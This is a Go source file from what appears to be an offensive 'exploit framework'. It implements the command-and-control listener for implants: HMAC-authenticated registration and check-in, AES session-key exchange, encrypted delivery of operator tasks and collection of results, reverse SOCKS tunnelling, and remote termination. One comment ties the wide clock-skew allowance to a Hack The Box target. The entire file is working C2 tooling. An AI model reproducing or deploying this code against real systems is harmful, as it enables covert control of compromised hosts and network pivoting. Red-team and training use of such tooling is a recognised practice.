package listeners

import (
	"fmt"
	"log"
	"strings"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"google.golang.org/protobuf/proto"
)

// ErrBeaconAuth is returned when implant auth fails (callers keep silent 404 on the wire).
var ErrBeaconAuth = fmt.Errorf("beacon auth failed")

// authFail wraps ErrBeaconAuth with a short reason class for server logs.
// Reason values: unknown_implant | hmac | skew | replay | internal
func authFail(reason, detail string) error {
	if detail == "" {
		return fmt.Errorf("%w: %s", ErrBeaconAuth, reason)
	}
	return fmt.Errorf("%w: %s: %s", ErrBeaconAuth, reason, detail)
}

func hmacRejectReason(err error) string {
	if err == nil {
		return "hmac"
	}
	msg := err.Error()
	if strings.Contains(msg, "replay window") || strings.Contains(msg, "outside replay") {
		return "skew"
	}
	if strings.Contains(msg, "HMAC verification failed") {
		return "hmac"
	}
	return "hmac"
}

// SecretResolver looks up the per-implant HMAC/wrap secret.
// If nil, BeaconHandler.Secret is used as a legacy fleet-wide PSK.
type SecretResolver func(implantID string) ([]byte, error)

// SocksBridge multiplexes reverse SOCKS frames over the beacon channel.
type SocksBridge interface {
	DrainOutbound(sessionID string) []*pb.SocksFrame
	RequeueOutbound(sessionID string, frames []*pb.SocksFrame)
	HandleInbound(sessionID string, frames []*pb.SocksFrame)
	Active(sessionID string) bool
}

// resolveSecret returns the implant auth secret for HMAC and session-key wrap.
func resolveSecret(h *BeaconHandler, implantID string) ([]byte, error) {
	if h.ResolveSecret != nil {
		return h.ResolveSecret(implantID)
	}
	if len(h.Secret) > 0 {
		return h.Secret, nil
	}
	return nil, fmt.Errorf("no implant secret")
}

// HandleRegister processes an implant registration.
func HandleRegister(h *BeaconHandler, reg *pb.Register, protocol, remoteAddr string) (*pb.RegisterResponse, error) {
	secret, err := resolveSecret(h, reg.ImplantId)
	if err != nil || len(secret) == 0 {
		detail := "no secret"
		if err != nil {
			detail = err.Error()
		}
		log.Printf("[register] unknown_implant id=%s: %s", reg.ImplantId, detail)
		return nil, authFail("unknown_implant", detail)
	}
	// 8h window: HTB Fries (and similar) often have multi-hour DC/host skew.
	if err := zcrypto.VerifyHMAC(secret, reg.ImplantId, reg.Timestamp, reg.Hmac, 8*3600); err != nil {
		reason := hmacRejectReason(err)
		log.Printf("[register] %s reject implant=%s: %v", reason, reg.ImplantId, err)
		return nil, authFail(reason, err.Error())
	}
	if h.ReplayCache != nil {
		if err := h.ReplayCache.CheckAndRecord(reg.ImplantId, reg.Timestamp); err != nil {
			log.Printf("[register] replay reject implant=%s: %v", reg.ImplantId, err)
			return nil, authFail("replay", err.Error())
		}
	}

	sess := sessions.NewSession(reg, protocol, remoteAddr)

	sessionKey, err := zcrypto.GenerateAESKey()
	if err != nil {
		return nil, fmt.Errorf("generate session key: %w", err)
	}
	sess.SessionKey = sessionKey

	sessionID, isReconnect, err := h.Sessions.RegisterOrReconnect(sess)
	if err != nil {
		return nil, fmt.Errorf("register session: %w", err)
	}

	if isReconnect {
		log.Printf("[%s] session reconnected: %s (implant=%s, host=%s, user=%s)",
			protocol, sessionID, reg.ImplantId, reg.Hostname, reg.Username)
	} else {
		log.Printf("[%s] new session: %s (implant=%s, host=%s, user=%s)",
			protocol, sessionID, reg.ImplantId, reg.Hostname, reg.Username)
		if h.OnEvent != nil {
			h.OnEvent(&pb.Event{
				Type:      pb.EventType_EVENT_SESSION_NEW,
				Timestamp: time.Now().Unix(),
				SessionId: sessionID,
				Message:   fmt.Sprintf("New session from %s@%s", reg.Username, reg.Hostname),
			})
		}
	}

	encryptedKey, err := zcrypto.AESEncrypt(secret, sessionKey)
	if err != nil {
		return nil, fmt.Errorf("encrypt session key: %w", err)
	}

	// NextCheckinMs 0 = implant keeps build-time sleep (do not force 5s override).
	// When session has an operator-set interval, use that instead.
	nextMs := sess.NextCheckinMs()
	return &pb.RegisterResponse{
		Success:             true,
		SessionId:           sessionID,
		NextCheckinMs:       nextMs,
		EncryptedSessionKey: encryptedKey,
	}, nil
}

// HandleBeacon processes an implant beacon check-in.
func HandleBeacon(h *BeaconHandler, beacon *pb.Beacon) (*pb.BeaconResponse, error) {
	secret, err := resolveSecret(h, beacon.ImplantId)
	if err != nil || len(secret) == 0 {
		detail := "no secret"
		if err != nil {
			detail = err.Error()
		}
		log.Printf("[beacon] unknown_implant id=%s: %s", beacon.ImplantId, detail)
		return nil, authFail("unknown_implant", detail)
	}
	if err := zcrypto.VerifyHMAC(secret, beacon.ImplantId, beacon.Timestamp, beacon.Hmac, 8*3600); err != nil {
		reason := hmacRejectReason(err)
		log.Printf("[beacon] %s reject implant=%s: %v", reason, beacon.ImplantId, err)
		return nil, authFail(reason, err.Error())
	}
	if h.ReplayCache != nil {
		if err := h.ReplayCache.CheckAndRecord(beacon.ImplantId, beacon.Timestamp); err != nil {
			log.Printf("[beacon] replay reject implant=%s: %v", beacon.ImplantId, err)
			return nil, authFail("replay", err.Error())
		}
	}

	sess, ok := h.Sessions.GetByImplant(beacon.ImplantId)
	if !ok {
		log.Printf("[beacon] unknown implant=%s (not registered)", beacon.ImplantId)
		return nil, authFail("unknown_implant", "not registered")
	}

	h.Sessions.UpdateCheckin(sess.SessionID)

	var results []*pb.TaskResult
	var inboundSocks []*pb.SocksFrame
	if sess.SessionKey != nil {
		if len(beacon.EncryptedResults) > 0 {
			plaintext, err := zcrypto.AESDecrypt(sess.SessionKey, beacon.EncryptedResults)
			if err != nil {
				log.Printf("[beacon] decrypt results error: %v", err)
			} else {
				payload := &pb.BeaconResultsPayload{}
				if err := proto.Unmarshal(plaintext, payload); err != nil {
					log.Printf("[beacon] unmarshal decrypted results error: %v", err)
				} else {
					results = payload.Results
					inboundSocks = payload.SocksFrames
				}
			}
		}
		// Fail-closed: ignore plaintext results when session encryption is active.
	} else {
		results = beacon.Results
	}

	for _, result := range results {
		if h.Dispatcher != nil {
			h.Dispatcher.HandleResultForSession(sess.SessionID, result)
		}
	}
	if h.Socks != nil && len(inboundSocks) > 0 {
		h.Socks.HandleInbound(sess.SessionID, inboundSocks)
	}

	pendingTasks := sess.DrainTasks()
	var outboundSocks []*pb.SocksFrame
	if h.Socks != nil {
		outboundSocks = h.Socks.DrainOutbound(sess.SessionID)
	}

	// 0 = implant keeps its current sleep; non-zero only when operator set interval.
	// Do not force a short interval for SOCKS here — implant shortens sleep when
	// SocksActive() and a permanent NextCheckinMs=100 would stick after SOCKS stop.
	// Terminate uses ShouldTerminate (operator kill), not mere Alive — UpdateCheckin
	// would otherwise revive killed sessions before this flag is read.
	resp := &pb.BeaconResponse{
		NextCheckinMs: sess.NextCheckinMs(),
		Terminate:     sess.ShouldTerminate(),
	}

	if sess.SessionKey != nil && (len(pendingTasks) > 0 || len(outboundSocks) > 0) {
		payload := &pb.BeaconTasksPayload{Tasks: pendingTasks, SocksFrames: outboundSocks}
		plaintext, err := proto.Marshal(payload)
		if err != nil {
			log.Printf("[beacon] marshal tasks payload error: %v", err)
			sess.RequeueTasks(pendingTasks)
			if h.Socks != nil {
				h.Socks.RequeueOutbound(sess.SessionID, outboundSocks)
			}
		} else {
			encrypted, err := zcrypto.AESEncrypt(sess.SessionKey, plaintext)
			if err != nil {
				log.Printf("[beacon] encrypt tasks error: %v", err)
				sess.RequeueTasks(pendingTasks)
				if h.Socks != nil {
					h.Socks.RequeueOutbound(sess.SessionID, outboundSocks)
				}
			} else {
				resp.EncryptedTasks = encrypted
			}
		}
	} else if sess.SessionKey == nil {
		resp.Tasks = pendingTasks
	}

	return resp, nil
}
